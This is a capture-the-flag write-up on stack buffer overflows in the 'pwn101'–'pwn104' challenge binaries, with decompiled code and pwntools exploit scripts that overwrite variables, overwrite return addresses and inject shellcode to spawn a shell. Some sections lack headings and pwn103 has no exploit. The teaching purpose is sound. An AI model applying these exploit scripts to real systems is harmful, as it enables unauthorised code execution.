pwn101

We are given a binary called pwn101 with the following protections.

$ checksec pwn101
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No

When we open it with Ghidra we can see the following in the main() function.

void main(void)

{
  char local_48 [60];
  int local_c;
  
  local_c = 0x539;
  setup();
  banner();
  puts(
      "Hello!, I am going to shopping.\nMy mom told me to buy some ingredients.\nUmmm.. But I have l ow memory capacity, So I forgot most of them.\nAnyway, she is preparing Briyani for lunch, Can  you help me to buy those items :D\n"
      );
  puts("Type the required ingredients to make briyani: ");
  gets(local_48);
  if (local_c == 0x539) {
    puts("Nah bruh, you lied me :(\nShe did Tomato rice instead of briyani :/");
                    /* WARNING: Subroutine does not return */
    exit(0x539);
  }
  puts("Thanks, Here\'s a small gift for you <3");
  system("/bin/sh");
  return;
}

Source code analysis

It defines a 60 byte buffer in the local_48 variable and below it takes our input using gets(), this makes the binary vulnerable to Buffer Overflow, since gets() is an insecure function that does not control the size of our input allowing us to overflow the buffer.

And finally if the local_c variable is not equal to 1337 (0x539 in hexadecimal) we get a shell.

Exploit and shell

What we have to do here is clear, we have to send 60 bytes to unboard the buffer, overwrite the local_c variable so that it does not fulfill the if conditional and get the shell.

from pwn import *

context.binary = ELF('./pwn101')
p = remote('10.10.163.87', 9001)

payload = b'A' * 60 # _BYTE var_40[60]

p.sendline(payload)
p.interactive()

pwn102

We are given a binary called pwn102 with the following protections.

$ checksec pwn102
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No

When opening the binary in Ghidra we see the following in the main() function.

void main(void)

{
  undefined local_78 [104];
  int local_10;
  int local_c;
  
  setup();
  banner();
  local_c = 0xbadf00d;
  local_10 = L'\xfee1dead';
  printf("I need %x to %x\nAm I right? ",0xbadf00d,0xfee1dead);
  __isoc99_scanf(&DAT_00100b66,local_78);
  if ((local_c == 0xc0ff33) && (local_10 == 0xc0d3)) {
    printf("Yes, I need %x to %x\n",0xc0ff33,0xc0d3);
    system("/bin/sh");
    return;
  }
  puts("I\'m feeling dead, coz you said I need bad food :(");
                    /* WARNING: Subroutine does not return */
  exit(0x539);
}

Analysis of the source code

We see that it defines a buffer of 104 bytes in the variable local_78, then it creates two more variables, one called local_c with the value 0xbadf00d and another called local_10 with the value 0xfee1dead, takes our input using scanf() and makes a comparison using an if statement.

To solve this challenge we must fill the buffer and overwrite the local_c variable with the value 0xc0ff33 and the local_10 variable with the value 0xc0d3, if we achieve this it will return a shell and we will be able to read the flag. We can see this in IDA to understand it better.

Exploit y shell

Then we have to fill the buffer with 104 bytes and send 0xc0d3 plus 0xc0ff33.

from pwn import *

context.binary = ELF('./pwn102')
p = remote('10.10.163.87', 9002)

FIRST_PARAMETER = 0xc0d3
SECOND_PARAMETER = 0xc0ff33 

junk = 104
offset = b'A' * junk

payload = offset
payload += p32(FIRST_PARAMETER)
payload += p32(SECOND_PARAMETER)

p.sendline(payload)
p.interactive()

Analysis of the source code

We can see that the general() function is vulnerable to Buffer Overflow, since it uses __isoc99_scanf to read user data and stores the result in local_28, a 32-byte buffer, without checking the input size. If the user provides more than 32 bytes, the data will overwrite adjacent memory, which could allow arbitrary code execution or control flow corruption. If we press option 3 and send too many bytes we can see that the program gives a memory error.

Analysis of the source code

In the local_58 variable a buffer of 80 bytes is defined, but the read() function is configured to read up to 200 bytes. This makes the binary vulnerable to Buffer Overflow, since the program allows the user to input more than the 80 bytes reserved for the buffer.

By allowing the input size to be larger than the defined buffer, the program overwrites adjacent memory areas, including the stack frame.

The use of printf() is crucial, since it prime the address of the local_58 variable, which will allow us to calculate exactly the return address that will be overwritten when the Buffer Overflow is exploited (since ASLR will be enabled on the remote instance).

As NX is disabled, we can insert shellcode in the stack and execute it. For this we can take advantage of the Buffer Overflow and overwrite the return address with this address. Then, instead of putting any bytes, we will put shellcode to get a shell.

If you don’t understand what is a shellcode I invite you to read this post .

We need 88 bytes to overwrite the return address, after that we can enter the shellcode.

To create the shellcode we will use the shellcraft.sh() function of pwntools, with the following script we solve the challenge.

Exploit and shell 

from pwn import *

context.binary = ELF('./pwn104')
p = process()

# Leaking address
p.recvuntil(b"I'm waiting for you at ")
address = int(p.recvline().strip(), 16)
log.info(f'Shellcode address {address}')

payload = asm(shellcraft.sh())
payload = payload.ljust(88, b'A')
payload += p64(address)

p.sendline(payload)
p.interactive()
